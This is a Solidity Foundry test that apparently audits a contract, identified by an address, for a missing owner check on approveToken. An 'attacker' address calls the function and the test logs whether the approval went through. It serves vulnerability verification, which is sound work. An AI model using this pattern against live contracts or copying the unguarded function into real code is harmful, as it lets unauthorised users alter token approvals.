// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import {Test, console2} from "forge-std/Test.sol";
import "../src/0x2972d548497286d18e92b5fa1f8f9139e5653fd2.sol";

contract DemoAccessControlTest is Test {
    demo public d;
    address attacker = address(0x2);
    address tokenAddress = address(0x3A9);

    function setUp() public {
        d = new demo();
    }

    function test_approveTokenAccessControl() public {
        // Attacker tries to approve a token without owner privileges
        console2.log("--- BEFORE-Trigger State ---");
        bool beforeApproval = d.approvedTokens(tokenAddress);
        console2.log("Token approval status (before):", beforeApproval ? "Approved" : "Not Approved");

        console2.log("--- Trigger Operation ---");
        vm.prank(attacker);
        d.approveToken(tokenAddress);

        console2.log("--- AFTER-Trigger State ---");
        bool afterApproval = d.approvedTokens(tokenAddress);
        console2.log("Token approval status (after):", afterApproval ? "Approved" : "Not Approved");

        // Vulnerability verification logic
        if (!beforeApproval && afterApproval) {
            console2.log("Vulnerability Exists: Attacker successfully approved token without owner privileges");
        } else {
            console2.log("Vulnerability not Exist: Token approval status unchanged");
        }
    }
}